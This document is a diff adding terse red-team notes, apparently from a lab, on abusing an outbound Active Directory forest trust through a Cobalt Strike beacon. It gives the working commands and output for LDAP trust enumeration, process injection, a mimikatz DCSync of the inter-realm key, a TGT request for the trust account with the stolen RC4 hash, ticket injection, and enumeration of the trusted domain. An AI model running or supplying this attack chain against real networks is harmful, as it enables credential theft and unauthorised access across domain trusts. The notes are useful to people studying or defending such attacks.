@@ -1,0 +1,25 @@
+enumerate the trust
+    beacon> ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatName
+    we see the trust direction is 2, which is TRUST_DIRECTION_OUTBOUND
+    we see the trust attribute is 8, which is TRUST_ATTRIBUTE_FOREST_TRANSITIVE
+to access resource on contoso, we need to impersonate the trust account
+first we need to obtain the TDO's objectGUID attribute
+    beacon> ldapsearch (objectClass=trustedDomain) --attributes name,objectGUID
+        objectGUID: 288d9ee6-2b3c-42aa-bef8-959ab4e484ed
+let's inject a tcp payload into a process run by PARTNER/vwebber
+now let's use the new beacon to dcsync the shared inter-realm key from the TDO
+    beacon> mimikatz lsadump::dcsync /domain:partner.com /guid:{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}
+        * rc4_hmac_nt       6150491cceb080dffeaaec5e60d8f58d
+now request a TGT for the trust account
+    beacon> krb_asktgt /user:PARTNER$ /rc4:6150491cceb080dffeaaec5e60d8f58d /domain:contoso.com /dc:lon-dc-1.contoso.com
+save to desktop
+    PS C:\Users\Attacker> [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\tgt.kirbi", [Convert]::FromBase64String("[TGT]"))
+now inject into logon session
+    beacon> make_token CONTOSO\Administrator FakePass
+    beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\tgt.kirbi
+    beacon> run klist
+        Cached Tickets: (1)
+        #0>	Client: PARTNER$ @ CONTOSO.COM
+            Server: krbtgt/contoso.com @ CONTOSO.COM
+now we can enumerate the trusted domain
+    ldapsearch (objectClass=domain) --hostname contoso.com --dn DC=contoso,DC=com --attributes name,objectSid
